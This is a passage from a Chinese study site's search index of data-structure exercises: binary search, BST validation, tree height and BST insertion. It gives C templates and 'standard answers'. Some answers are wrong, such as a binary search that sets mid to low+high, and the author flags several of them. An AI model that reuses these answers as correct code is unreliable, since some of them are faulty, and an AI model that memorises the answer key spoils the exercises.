Only<pre><code>-1\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_6","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nint BinSrch (int str[], int key, int low, int high) {\n    //\u6298\u534a\u67e5\u627e\u9012\u5f52\u7b97\u6cd5\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n}\n\nint main () {\n    int str[] = { 1,2,3,4,5,6,7,8,9 };\n    int index;\n    printf(\"\u8bf7\u8f93\u5165\u67e5\u627e\u7684\u6570\u5b57[\u627e\u5230\u8fd4\u56de\u4e0b\u6807\uff0c\u5426\u5219\u8fd4\u56de-1]\uff1a\");\n    scanf(\"%d\", &amp;index);\n    index = BinSrch(str, index, 0, 8);\n    printf(\"%d\\n\", index);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_7","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u6211\u6709\u4e2a\u95ee\u9898\uff0c\u4e3a\u4ec0\u4e48<code>mid</code>\u521d\u59cb\u5316\u4e0d\u662f<code>(low+high)/2</code>\u5462\uff1f\u4e0d\u8fc7\u90fd\u80fd\u901a\u8fc7\u68c0\u67e5\u3002</p> <p>\u53e6\u5916\uff0c\u6700\u540e\u9762\u7684<code>return -1</code>\u4e5f\u662f\u53ef\u6709\u53ef\u65e0\uff0c\u4e0d\u4f1a\u6267\u884c\u5230\u90a3\u91cc\u7684\u3002</p> C<pre><code>int BinSrch (int str[], int key, int low, int high) {\n    int mid = (low + high);\n    if (low &gt; high) {\n        return -1;\n    }\n    if (key == str[mid]) {\n        return mid;\n    }\n    else if (key &gt; str[mid]) {\n        return BinSrch(str, key, mid + 1, high);\n    }\n    else {\n        return BinSrch(str, key, low, mid - 1);\n    }\n\n    return -1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_8","title":"\u5224\u522b\u7ed9\u5b9a\u4e8c\u53c9\u6811\u662f\u5426\u4e3a\u4e8c\u53c9\u6392\u5e8f\u6811","text":"<p>\u7ed9\u5b9a\u4e00\u68f5\u4e8c\u53c9\u6811\uff0c\u5224\u65ad\u5b83\u662f\u5426\u4e3a\u4e8c\u53c9\u6392\u5e8f\u6811\uff08BST\uff09\u3002\u4e8c\u53c9\u6392\u5e8f\u6811\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4e8c\u53c9\u6811\uff0c\u5bf9\u4e8e\u6811\u4e2d\u7684\u6bcf\u4e2a\u7ed3\u70b9\uff0c\u5176\u5de6\u5b50\u6811\u7684\u6240\u6709\u7ed3\u70b9\u7684\u503c\u90fd\u5c0f\u4e8e\u8be5\u7ed3\u70b9\u7684\u503c\uff0c\u800c\u53f3\u5b50\u6811\u7684\u6240\u6709\u7ed3\u70b9\u7684\u503c\u90fd\u5927\u4e8e\u8be5\u7ed3\u70b9\u7684\u503c\u3002\u8bf7\u5b9e\u73b0\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u8f93\u5165\u4e00\u68f5\u4e8c\u53c9\u6811\u7684\u5148\u5e8f\u904d\u5386\u7ed3\u679c\uff0c\u5224\u65ad\u8be5\u4e8c\u53c9\u6811\u662f\u5426\u662f\u4e8c\u53c9\u6392\u5e8f\u6811\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_9","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a532##4##76##8##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8be5\u4e8c\u53c9\u6811\u662f\u4e8c\u53c9\u6392\u5e8f\u6811\uff01\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_10","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint flag = 1;      // \u5224\u65ad\u7236\u7ed3\u70b9\u7684\u503c\u662f\u5426\u5927\u4e8e\u5b69\u5b50\u7ed3\u70b9\u7684\u503c\nint father_value = 0; // \u7528\u4e8e\u5b58\u50a8\u4e2d\u5e8f\u904d\u5386\u65f6\u7236\u8282\u70b9\u7684\u503c\n\nint Isbstree(Bitree T) {\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T);\n    if (Isbstree(T))\n        printf(\"\\n\u8be5\u4e8c\u53c9\u6811\u662f\u4e8c\u53c9\u6392\u5e8f\u6811\uff01\\n\");\n    else\n        printf(\"\\n\u8be5\u4e8c\u53c9\u6811\u4e0d\u662f\u4e8c\u53c9\u6392\u5e8f\u6811\uff01\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_11","title":"\u7b54\u6848","text":"<p>\u65b9\u6cd5\u4e00\uff1a\u4e2d\u5e8f\u904d\u5386\uff0c\u770b\u662f\u5426\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff0c\u7528<code>flag</code>\u8bb0\u5f55\u503c\uff0c\u5982\u679c\u503c\u4e3a<code>1</code>\u5219\u662f\u4e8c\u53c9\u6392\u5e8f\u6811\uff0c\u53cd\u4e4b\u5219\u5426</p> <p>\u7f3a\u70b9\uff1a\u9700\u8981\u904d\u5386\u5b8c\u6574\u4e2a\u4e8c\u53c9\u6811\u624d\u80fd\u7684\u503c\u662f\u5426\u662f\u4e8c\u53c9\u6392\u5e8f\u6811</p> <p>\u8fd9\u4e2a\u548c\u6807\u51c6\u7b54\u6848\u5dee\u4e0d\u591a</p> C<pre><code>int flag = 1;      // \u5224\u65ad\u7236\u7ed3\u70b9\u7684\u503c\u662f\u5426\u5927\u4e8e\u5b69\u5b50\u7ed3\u70b9\u7684\u503c\nint father_value = NULL; // \u7528\u4e8e\u5b58\u50a8\u4e2d\u5e8f\u904d\u5386\u65f6\u7236\u8282\u70b9\u7684\u503c\n\nint Isbstree(Bitree bt){\n    if (bt != 0) {\n        Isbstree(bt-&gt;lchild);\n\n        if (father_value &gt; bt-&gt;data) {\n            flag = 0;\n        }\n\n        father_value = bt-&gt;data;\n\n        Isbstree(bt-&gt;rchild);\n    }\n    return flag;\n}\n</code></pre> <p>\u65b9\u6cd5\u4e8c\uff1a\u5148\u904d\u5386\u6839\uff0c\u518d\u904d\u5386\u6240\u6709\u7684\u5de6\u5b50\u6811\uff0c\u6700\u540e\u518d\u904d\u5386\u6240\u6709\u7684\u53f3\u5b50\u6811\uff08\u4e0d\u662f\u524d\u5e8f\u904d\u5386\uff09</p> <p>\u8fd9\u79cd\u4e5f\u633a\u6709\u610f\u601d\u7684\u3002</p> C<pre><code>int Isbstree(Bitree T) { //\u8fd4\u56de1\u8868\u793a\u4e3a\u4e8c\u53c9\u6392\u5e8f\u6811\uff0c\u8fd4\u56de0\u8868\u793a\u4e0d\u662f \n    int flag1 = 0, flag2 = 0;\n\n    if (T-&gt;lchild != NULL)\n    {\n        flag1 = 1;\n        if (T-&gt;lchild-&gt;data &gt; T-&gt;data) {\n            return 0;\n        }\n    }\n    if (flag1 == 1 &amp;&amp; Isbstree(T-&gt;lchild) == 0) {\n        return 0;    //\u8fd9\u91ccflag1\u7684\u4f5c\u7528\u662f\u9632\u6b62\u65e0\u9650\u904d\u5386\u5de6\u5b50\u6811\uff0cflag2\u540c\u7406\n        // \u4e5f\u5c31\u662f\u5982\u679c\u6709\u4e00\u4e2areturn 0\u4e86\uff0c\u90a3\u5c31\u4e00\u8def\u5411\u4e0areturn 0\n    }\n\n    if (T-&gt;rchild != NULL)\n    {\n        flag2 = 1;\n        if (T-&gt;rchild-&gt;data &lt; T-&gt;data) {\n            return 0;\n        }\n    }\n    if (flag2 == 1 &amp;&amp; Isbstree(T-&gt;rchild) == 0) {\n        return 0;\n    }\n\n    return 1;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_12","title":"\u6807\u51c6\u7b54\u6848\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"<p>\u4e8c\u53c9\u6392\u5e8f\u6811</p> <ol> <li>\u82e5\u5b83\u7684\u5de6\u5b50\u6811\u4e0d\u7a7a\uff0c\u5219\u5de6\u5b50\u6811\u4e0a\u6240\u6709\u7ed3\u70b9\u7684\u503c\u5747\u5c0f\u4e8e\u6839\u7ed3\u70b9\u7684\u503c\uff1b</li> <li>\u82e5\u5b83\u7684\u53f3\u5b50\u6811\u4e0d\u7a7a\uff0c\u5219\u53f3\u5b50\u6811\u4e0a\u6240\u6709\u7ed3\u70b9\u7684\u503c\u5747\u5927\u4e8e\u6839\u7ed3\u70b9\u7684\u503c\uff1b</li> <li>\u5b83\u7684\u5de6\u3001\u53f3\u5b50\u6811\u4e5f\u90fd\u5206\u522b\u662f\u4e8c\u53c9\u6392\u5e8f\u6811\u3002</li> </ol> <p>\u89e3\u9898\u601d\u8def\uff1a</p> <ol> <li>\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u5e8f\u904d\u5386\u6240\u5f97\u7ed3\u70b9\u503c\u4e3a\u589e\u5e8f\uff1b</li> <li>\u5728\u904d\u5386\u4e2d\u5c06\u5f53\u524d\u904d\u5386\u7ed3\u70b9\u4e0e\u5176\u524d\u9a71\u7ed3\u70b9\u7684\u503c\u8fdb\u884c\u6bd4\u8f83\uff1b</li> <li>\u8bbe\u5168\u5c40\u6307\u9488\u53d8\u91cf<code>pre</code>\uff08\u521d\u503c\u4e3a<code>null</code>\uff09\u548c<code>flag</code>\uff08\u521d\u503c\u4e3a<code>true</code>\uff09\u3002</li> </ol> C<pre><code>void Creat_Bitree(Bitree *T) {\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL;\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;((*T)-&gt;lchild));\n        Creat_Bitree(&amp;((*T)-&gt;rchild));\n    }\n}\n\nint flag = 1;      // \u5224\u65ad\u7236\u7ed3\u70b9\u7684\u503c\u662f\u5426\u5927\u4e8e\u5b69\u5b50\u7ed3\u70b9\u7684\u503c\nint father_value = 0; // \u7528\u4e8e\u5b58\u50a8\u4e2d\u5e8f\u904d\u5386\u65f6\u7236\u8282\u70b9\u7684\u503c\n\nint Isbstree(Bitree T) {\n    if (T-&gt;lchild &amp;&amp; flag) {\n        Isbstree(T-&gt;lchild);\n    }\n\n    if (T-&gt;data &lt; father_value) {\n        flag = 0; // \u5de6\u5b50\u6811\u503c\u5927\u4e8e\u7236\u7ed3\u70b9\u503c\n    }\n\n    father_value = T-&gt;data; // \u66f4\u65b0\u7236\u7ed3\u70b9\u7684\u503c\\\n\n    if (T-&gt;rchild &amp;&amp; flag) {\n        Isbstree(T-&gt;rchild);\n    }\n\n    return flag;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#x","title":"\u7f16\u5199\u7b97\u6cd5\u4ece\u5c0f\u5230\u5927\u8f93\u51fa\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u6240\u6709\u6570\u636e\u503c&gt;=x\u7684\u7ed3\u70b9\u503c","text":"<p>\u5df2\u77e5\u4e8c\u53c9\u6392\u5e8f\u6811\u91c7\u7528\u4e8c\u53c9\u94fe\u8868\u5b58\u50a8\u7ed3\u6784\uff0c\u6839\u7ed3\u70b9\u7684\u6307\u9488\u4e3a<code>T</code>\uff0c\u94fe\u7ed3\u70b9\u7684\u7ed3\u6784\u4e3a<code>(lchild, data, rchild)</code>\uff0c\u5176\u4e2d<code>lchild</code>\uff0c<code>rchild</code>\u5206\u522b\u6307\u5411\u8be5\u7ed3\u70b9\u5de6\u3001\u53f3\u5b69\u5b50\u7684\u6307\u9488\uff0c<code>data</code>\u57df\u5b58\u653e\u7ed3\u70b9\u7684\u6570\u636e\u4fe1\u606f\u3002\u8bf7\u7f16\u5199\u7b97\u6cd5\uff0c\u4ece\u5c0f\u5230\u5927\u8f93\u51fa\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u6240\u6709<code>\u6570\u636e\u503c \u2265 x</code>\u7684\u7ed3\u70b9\u7684\u6570\u636e\u3002\u8981\u6c42\u5148\u627e\u5230\u7b2c\u4e00\u4e2a\u6ee1\u8db3\u6761\u4ef6\u7684\u7ed3\u70b9\u540e\uff0c\u518d\u4f9d\u6b21\u8f93\u51fa\u5176\u4ed6\u6ee1\u8db3\u6761\u4ef6\u7684\u7ed3\u70b9\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_13","title":"\u793a\u4f8b","text":"<p>\u8981\u6c42</p> Text Only<pre><code>\u7528 -1 \u8868\u793a\u65e0\u5b69\u5b50\u7ed3\u70b9\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a5\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a3\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a7\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165x\u7684\u503c\uff1a4\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u5927\u4e8e\u7b49\u4e8ex\u7684\u7ed3\u70b9\u6709\uff1a5 7\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_14","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    int data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Print_Node(Bitree T) {\n    //\u4e2d\u5e8f\u8f93\u51fa\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Print_All_x(Bitree T, int x) {\n    //\u8f93\u51fa\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u5927\u4e8e\u7b49\u4e8ex\u7684\u7ed3\u70b9\u503c\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    int x;\n    Creat_Bitree(&amp;T);\n    printf(\"\u8bf7\u8f93\u5165x\u7684\u503c\uff1a\");\n    scanf(\"%d\", &amp;x);\n    printf(\"\u5927\u4e8e\u7b49\u4e8ex\u7684\u7ed3\u70b9\u6709\uff1a\");\n    Print_All_x(T, x);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_15","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u5f88\u6709\u610f\u601d\uff0c\u591a\u770b\u51e0\u904d\u7406\u89e3\u7406\u89e3</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n    int node;\n    //printf(\"\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a\");\n    scanf(\"%d\", &amp;node);\n\n    if (node == -1) {\n        return;\n    }\n\n    *T = (Bitree)malloc(sizeof(BiTNode));\n    (*T)-&gt;data = node;\n    //(*T)-&gt;lchild = NULL;\n    //(*T)-&gt;rchild = NULL;\n\n    Creat_Bitree(&amp;((*T)-&gt;lchild));\n    Creat_Bitree(&amp;((*T)-&gt;rchild));\n}\n\nvoid Print_Node(Bitree T) {\n    if (T) {\n        Print_Node(T-&gt;lchild);\n        printf(\"%d \", T-&gt;data);\n        Print_Node(T-&gt;rchild);\n    }\n}\n\nvoid Print_All_x(Bitree T, int x) {\n    // \u5b9a\u4e49\u6307\u9488p\u6307\u5411\u4e8c\u53c9\u6811\u6839\u8282\u70b9\n    Bitree p = T;\n    // \u5982\u679c\u6839\u8282\u70b9\u4e0d\u4e3a\u7a7a\n    if (p) {\n        // \u5f53\u8282\u70b9\u503c\u5c0f\u4e8ex\u65f6\uff0c\u6cbf\u53f3\u5b50\u6811\u904d\u5386\n        while (p &amp;&amp; p-&gt;data &lt; x) {\n            p = p-&gt;rchild;\n        } // \u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u5927\u4e8e\u7b49\u4e8ex\u7684\u8282\u70b9\u3002\n\n        // \u4ee5p\u4e3a\u65b0\u7684\u6839\u8282\u70b9\n        T = p;\n\n        // \u5982\u679cp\u4e0d\u4e3a\u7a7a\n        if (p) {\n            // \u5b9a\u4e49\u6307\u9488q\u6307\u5411p\n            Bitree q = p;\n            // \u5c06p\u6307\u5411\u5176\u5de6\u5b50\u6811\n            p = p-&gt;lchild;\n            // \u6574\u4e2a\u8fc7\u7a0b\u90fd\u4e0d\u9700\u8981\u7ba1\u53f3\u5b50\u6811\uff0c\u56e0\u4e3a\u53f3\u5b50\u6811\u80af\u5b9a&gt;=x\n\n            // \u5f53\u8282\u70b9\u503c\u5927\u4e8e\u7b49\u4e8ex\u65f6\uff0c\u6cbf\u5de6\u5b50\u6811\u904d\u5386\n            while (p &amp;&amp; p-&gt;data &gt;= x) {\n                q = p;\n                p = p-&gt;lchild;\n            }\n\n            // \u5982\u679cp\u4e0d\u4e3a\u7a7a\uff0c\u5c06q\u7684\u5de6\u5b50\u6811\u7f6e\u4e3a\u7a7a\n            if (p) {\n                q-&gt;lchild = NULL;\n            }\n\n            // \u6253\u5370\u8f93\u51fa\u4ee5T\u4e3a\u6839\u8282\u70b9\u7684\u5b50\u6811\n            Print_Node(T);\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_16","title":"\u6c42\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6","text":"<p>\u7528\u6237\u6309\u7167\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u9010\u4e2a\u8f93\u5165\u4e8c\u53c9\u6811\u7684\u7ed3\u70b9\u503c\uff0c\u5176\u4e2d\u4f7f\u7528\u5b57\u7b26\u2019#'\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\u3002\u7f16\u5199\u7a0b\u5e8f\u8ba1\u7b97\u5e76\u8f93\u51fa\u8be5\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u3002\u4e3a\u4e86\u5224\u65ad\u5e73\u8861\u6027\uff0c\u6bcf\u4e2a\u7ed3\u70b9\u7684data\u5b57\u6bb5\u7528\u4e8e\u8868\u793a\u5e73\u8861\u56e0\u5b50\uff0c\u5f53data\u5c0f\u4e8e0\u65f6\uff0c\u904d\u5386\u53f3\u5b50\u6811\uff0c\u5426\u5219\u904d\u5386\u5de6\u5b50\u6811\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_17","title":"\u793a\u4f8b","text":"<p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a532##4##76##8##\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u8be5\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u662f\uff1a3\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_18","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    char data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u521b\u5efa\u4e8c\u53c9\u6811 \n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint Tree_Height(Bitree T) {\n    // \u6c42\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    printf(\"\u8bf7\u4ee5\u5148\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u5165\u7b2c\u4e00\u68f5\u6811\uff08#\u8868\u793a\u7ed3\u70b9\u6ca1\u6709\u5b50\u6811\uff09\uff1a\");\n    Creat_Bitree(&amp;T);\n    printf(\"\\n\u8be5\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u662f\uff1a%d\", Tree_Height(T));\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_19","title":"\u7b54\u6848","text":"C<pre><code>int Tree_Height(Bitree T) {\n    if (T == NULL) {\n        return 0;\n    } else {\n        int left_height = Tree_Height(T-&gt;lchild);\n        int right_height = Tree_Height(T-&gt;rchild);\n        return (left_height &gt; right_height) ? (left_height + 1) : (right_height + 1);\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_20","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u6b63\u786e\uff09","text":"<p>\u89e3\u9898\u601d\u8def\uff1a\u6839\u7ed3\u70b9\u7684\u5c42\u6b21\u4e3a1\uff0c\u76f4\u5230\u5c42\u6570\u6700\u5927\u7684\u53f6\u5b50\u7ed3\u70b9\uff0c\u662f\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u9ad8\u5ea6\u3002\u5f53\u7ed3\u70b9\u7684\u5e73\u8861\u56e0\u5b50\u4e3a0\u65f6\uff0c\u4efb\u9009\u5de6\u53f3\u4e00\u5206\u679d\u5411\u4e0b\u67e5\u627e\uff0c\u82e5\u5e73\u8861\u56e0\u5b50\u7b49\u4e8e1\u6cbf\u5de6\u904d\u5386\uff0c\u82e5\u5e73\u8861\u56e0\u5b50\u7b49\u4e8e-1\u6cbf\u53f3\u904d\u5386\u3002</p> <p>\u4e0a\u8fb9\u662f<code>Alpha</code>\u5e73\u53f0\u7ed9\u51fa\u7684\u89e3\u6790\uff0c\u6211\u8ba4\u4e3a\u4e0d\u80fd\u8bf4\u4e0d\u592a\u6b63\u786e\uff0c\u53ea\u80fd\u8bf4\u4e00\u6d3e\u80e1\u8a00\u3002\u5728\u8fd9\u4e2a\u5e73\u8861\u4e8c\u53c9\u6811\u7684\u7ed3\u5408\u4e2d\uff0c<code>data</code>\u662f\u5143\u7d20\u6570\u636e\uff0c\u548c\u8fd9\u91cc\u7684<code>1</code>\u3001<code>-1</code>\u6709\u4ec0\u4e48\u5173\u7cfb\u3002\u6211\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u80fd\u901a\u8fc7<code>Alpha</code>\u68c0\u67e5\u3002</p> C<pre><code>void Creat_Bitree(Bitree *T) {\n    char ch;\n    ch = getchar();\n    if (ch == '#')\n        *T = NULL;\n    else {\n        *T = (Bitree)malloc(sizeof(BiTNode));\n        (*T)-&gt;data = ch;\n        Creat_Bitree(&amp;((*T)-&gt;lchild));\n        Creat_Bitree(&amp;((*T)-&gt;rchild));\n    }\n}\n\nint Tree_Height(Bitree T) {\n    Bitree p = T;\n    int height = 0;\n\n    while (p) {\n        height++;\n        if (p-&gt;data &lt; 0) {\n            p = p-&gt;rchild;\n        }\n        else {\n            p = p-&gt;lchild;\n        }\n    }\n    return height;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_21","title":"\u4e8c\u53c9\u6811\u4e2d\u63d2\u5165\u65b0\u8282\u70b9","text":"<p>\u5df2\u77e5\u975e\u7a7a\u4e8c\u53c9\u6392\u5e8f\u6811<code>T</code>\u7684\u7ed3\u70b9\u5f62\u5f0f\u4e3a<code>(lchild, data, rchild)</code>\uff0c\u5728\u6811\u4e2d\u67e5\u627e\u503c\u4e3a<code>X</code>\u7684\u7ed3\u70b9\uff0c\u82e5\u627e\u5230\uff0c\u5219\u8f93\u51fa\u539f\u6765\u7684\u4e8c\u53c9\u6392\u5e8f\u6811\uff0c\u5426\u5219\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u65b0\u7ed3\u70b9\u63d2\u5165\u6811\u4e2d\uff0c\u63d2\u5165\u540e\u4ecd\u4e3a\u4e8c\u53c9\u6392\u5e8f\u6811\uff0c\u5199\u51fa\u5176\u975e\u9012\u5f52\u7b97\u6cd5\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_22","title":"\u793a\u4f8b","text":"<p>\u8981\u6c42</p> Text Only<pre><code>1\u3001\u7528 -1 \u8868\u793a\u65e0\u5b69\u5b50\u7ed3\u70b9\n2\u3001\u4e8c\u53c9\u6392\u5e8f\u6811\u975e\u7a7a\n3\u3001\u4f7f\u7528\u975e\u9012\u5f52\u7b97\u6cd5\n</code></pre> <p>\u8f93\u5165</p> Text Only<pre><code>\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a5\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a-1\n\u8bf7\u8f93\u5165x\u7684\u503c\uff1a3\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>\u63d2\u5165\u6570\u636e\u540e\u65b0\u7684\u4e8c\u53c9\u6392\u5e8f\u6811\u4e3a\uff1a3 5\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_23","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct BiTNode {\n    int data;\n    struct BiTNode *lchild, *rchild;\n} BiTNode, *Bitree;\n\nvoid Creat_Bitree(Bitree *T) {\n    //\u521b\u5efa\u4e8c\u53c9\u6811\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Print_Node(Bitree T) {\n    //\u4e2d\u5e8f\u904d\u5386\u7684\u65b9\u5f0f\u8f93\u51fa\n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nvoid Search_Node(Bitree *T, int x) {\n    //\u67e5\u627e\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u7684\u6307\u5b9a\u7ed3\u70b9 \n    //\u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n\n}\n\nint main() {\n    Bitree T = NULL;\n    int x;\n    Creat_Bitree(&amp;T);\n    printf(\"\u8bf7\u8f93\u5165x\u7684\u503c\uff1a\");\n    scanf(\"%d\", &amp;x);\n    Search_Node(&amp;T, x);\n    printf(\"\u63d2\u5165\u6570\u636e\u540e\u65b0\u7684\u4e8c\u53c9\u6392\u5e8f\u6811\u4e3a\uff1a\");\n    Print_Node(T);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%9F%A5%E6%89%BE/#_24","title":"\u6807\u51c6\u7b54\u6848\uff08\u4e0d\u592a\u6b63\u786e\uff09","text":"<p>\u89e3\u9898\u601d\u8def\uff1a\u4e8c\u53c9\u6392\u5e8f\u6811\u4e2d\u5229\u7528\u5176\u6027\u8d28\uff0c\u5148\u548c\u6839\u7ed3\u70b9\u6bd4\u8f83\uff0c\u5982\u679c\u7b49\u4e8e\u6839\u7ed3\u70b9\uff0c\u5219\u8f93\u51fa\u539f\u4e8c\u53c9\u6811\uff0c\u5982\u679c\u5927\u4e8e\u6839\u7ed3\u70b9\uff0c\u5c31\u904d\u5386\u5176\u53f3\u5b69\u5b50\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff0c\u5982\u679c\u5c0f\u4e8e\u6839\u7ed3\u70b9\uff0c\u5c31\u904d\u5386\u5176\u5de6\u5b69\u5b50\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002\u627e\u5230\u6700\u7ec8\u4f4d\u7f6e\uff0c\u63d2\u5165\u4e8c\u53c9\u6811\u4e2d\u3002</p> C<pre><code>void Creat_Bitree(Bitree* T) {\n        int num;\n        //printf(\"\u8bf7\u8f93\u5165\u7ed3\u70b9\u503c\uff1a\");\n        scanf(\"%d\", 